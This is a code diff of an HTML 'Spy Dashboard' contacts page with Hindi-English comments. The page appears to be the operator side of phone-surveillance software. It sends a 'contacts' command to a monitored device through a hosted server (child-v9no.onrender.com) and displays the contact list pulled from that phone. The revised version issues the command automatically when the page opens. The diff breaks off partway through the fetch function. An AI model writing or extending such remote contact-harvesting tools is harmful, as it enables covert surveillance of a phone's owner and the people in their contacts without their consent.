@@ -3,114 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contacts - Spy Dashboard</title>
+    <title>Contact List</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
-            --text-main: #ffffff;
-            --text-muted: #aaaaaa;
-            --accent: #4caf50;
-        }
-
         body {
-            background-color: var(--bg-color);
+            background-color: #0f0f0f;
             background-image: linear-gradient(45deg, #000000, #1a1a1a);
-            color: var(--text-main);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
             padding: 20px;
-            display: flex;
-            justify-content: center;
+            display: flex; flex-direction: column; align-items: center;
         }
 
         .container {
-            width: 100%;
-            max-width: 450px;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 30px;
-            padding: 20px;
-            border: 1px solid var(--glass-border);
-            min-height: 80vh;
+            width: 100%; max-width: 500px;
         }
 
+        /* Back Button */
         .header {
-            display: flex;
-            align-items: center;
-            justify-content: space-between; /* Space between title and refresh btn */
-            margin-bottom: 25px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid var(--glass-border);
+            display: flex; align-items: center; gap: 15px; margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.1); padding: 15px; border-radius: 15px;
         }
-
-        .header-left { display: flex; align-items: center; }
-
         .back-btn {
-            color: var(--text-main);
-            font-size: 1.2rem;
-            text-decoration: none;
-            margin-right: 15px;
+            color: white; text-decoration: none; font-size: 1.2rem;
+            background: #333; height: 40px; width: 40px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
         }
 
-        .page-title {
-            font-size: 1.2rem;
-            font-weight: bold;
+        /* Status Box */
+        .status-box {
+            text-align: center; padding: 10px; margin-bottom: 15px;
+            background: rgba(0, 255, 136, 0.1); border: 1px solid #00ff88;
+            color: #00ff88; border-radius: 10px; font-size: 0.9rem;
+            display: none; /* Initially hidden */
+        }
+
+        /* Contact List */
+        .contact-list {
+            list-style: none; padding: 0; margin: 0;
+            background: rgba(255, 255, 255, 0.05); border-radius: 15px;
+            overflow: hidden;
+        }
+        .contact-item {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 15px; border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .contact-item:last-child { border-bottom: none; }
+        
+        .name { font-weight: bold; font-size: 1rem; }
+        .number { color: #aaa; font-size: 0.85rem; margin-top: 4px; }
+        
+        .call-btn {
+            background: #4caf50; color: white; border: none;
+            padding: 8px 15px; border-radius: 20px; cursor: pointer;
+            font-size: 0.8rem;
         }
 
         .refresh-btn {
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            color: var(--text-main);
-            padding: 8px 12px;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            transition: 0.3s;
-        }
-        .refresh-btn:hover { background: var(--accent); border-color: var(--accent); }
-
-        /* Contact List Styling */
-        .contact-list {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            max-height: 600px;
-            overflow-y: auto;
-        }
-
-        .contact-card {
-            background: var(--glass-bg);
-            padding: 15px;
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            border: 1px solid var(--glass-border);
-        }
-
-        .avatar {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(45deg, #4caf50, #2e7d32);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            margin-right: 15px;
-            font-size: 1.1rem;
-        }
-
-        .info { flex: 1; }
-        .name { font-size: 1rem; font-weight: 500; }
-        .number { font-size: 0.85rem; color: var(--text-muted); margin-top: 2px; }
-
-        .call-icon {
-            color: var(--accent);
-            font-size: 1.2rem;
-            padding: 10px;
-            cursor: pointer;
+            background: #2196F3; color: white; border: none; padding: 12px;
+            width: 100%; border-radius: 10px; margin-top: 20px; cursor: pointer;
+            font-weight: bold; font-size: 1rem;
         }
     </style>
 </head>
@@ -118,94 +70,47 @@
 
     <div class="container">
         <div class="header">
-            <div class="header-left">
-                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-                <span class="page-title">Contacts List</span>
-            </div>
-            <button class="refresh-btn" onclick="requestNewContacts()">
-                <i class="fa-solid fa-arrows-rotate"></i> Sync
-            </button>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+            <h2 style="margin:0;">Contacts</h2>
         </div>
 
-        <div class="contact-list" id="contactsContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">
-                <i class="fa-solid fa-spinner fa-spin"></i> Loading contacts...
-            </div>
-        </div>
+        <div id="statusMsg" class="status-box">Requesting Contacts...</div>
+
+        <ul id="contactsUl" class="contact-list">
+            <li class="contact-item" style="justify-content:center; color:#777;">
+                Click "Load Data" to fetch
+            </li>
+        </ul>
+
+        <button class="refresh-btn" onclick="fetchContacts()">
+            <i class="fa-solid fa-rotate-right"></i> Load / Refresh Data
+        </button>
     </div>
 
     <script>
-        // ✅ SERVER SETUP (Same as Index.html)
-        const RENDER_URL = "https://child-v9no.onrender.com";
-        const DEVICE_ID = "Child_Phone_01";
+        const SERVER_URL = "https://child-v9no.onrender.com";
+        const DEVICE_ID = "M2103K19I"; // Tumhara Sahi ID
 
-        // 1. Contacts Fetch karne ka function
-        function loadContacts() {
-            // Naye server ke hisab se API endpoint: /api/get-data/:id/:type
-            fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/contacts`)
-                .then(response => response.json())
-                .then(data => {
-                    const container = document.getElementById("contactsContainer");
-                    container.innerHTML = ""; // Clear loading text
-
-                    // Agar koi data nahi aaya ya list empty hai
-                    if(!data || data.length === 0) {
-                        container.innerHTML = `
-                            <div style='text-align:center; padding:20px; color: #aaa;'>
-                                <p>No contacts found yet.</p>
-                                <p style="font-size: 0.8rem;">Click 'Sync' button to request data from phone.</p>
-                            </div>`;
-                        return;
-                    }
-
-                    // Loop through data
-                    data.forEach(contact => {
-                        const initial = contact.name ? contact.name.charAt(0).toUpperCase() : "#";
-                        const name = contact.name || "Unknown";
-                        const number = contact.number || "No Number";
-
-                        const card = `
-                            <div class="contact-card">
-                                <div class="avatar">${initial}</div>
-                                <div class="info">
-                                    <div class="name">${name}</div>
-                                    <div class="number">${number}</div>
-                                </div>
-                                <a href="tel:${number}" class="call-icon" style="text-decoration:none;">
-                                    <i class="fa-solid fa-phone"></i>
-                                </a>
-                            </div>
-                        `;
-                        container.innerHTML += card;
-                    });
-                })
-                .catch(err => {
-                    console.error("Error:", err);
-                    document.getElementById("contactsContainer").innerHTML = 
-                        "<div style='text-align:center; color:#ff4444; margin-top:20px;'>Server not responding.<br>Check internet.</div>";
-                });
-        }
-
-        // 2. Phone ko Command bhejna (Agar list khali ho to)
-        function requestNewContacts() {
-            const btn = document.querySelector('.refresh-btn');
-            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Sent...';
+        // 1. Page khulte hi Command bhejo
+        window.onload = function() {
+            showStatus("Requesting contacts from phone...");
             
-            fetch(`${RENDER_URL}/api/send-command`, {
+            fetch(`${SERVER_URL}/api/send-command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
             })
             .then(res => res.json())
             .then(data => {
-                alert("Command sent! Wait 10-20 seconds, then refresh page.");
-                setTimeout(() => { btn.innerHTML = '<i class="fa-solid fa-arrows-rotate"></i> Sync'; }, 2000);
+                showStatus("Command Sent! Waiting for upload...");
+                // 5 Second baad automatically data check karega
+                setTimeout(fetchContacts, 5000);
             });
-        }
+        };
 
-        // Page khulte hi contacts load karo
-        loadContacts();
-
-    </script>
-</body>
-</html>
+        // 2. Server se File Uthao (contacts.json)
+        function fetchContacts() {
+            showStatus("Checking server for file...");
+            
+            // Note: Hum maan ke chal rahe hain server 'contacts.json' naam se file save karta hai
+            // Agar file ka naam alag hua (e.g., date ke sath), to hume folder check karna padega.
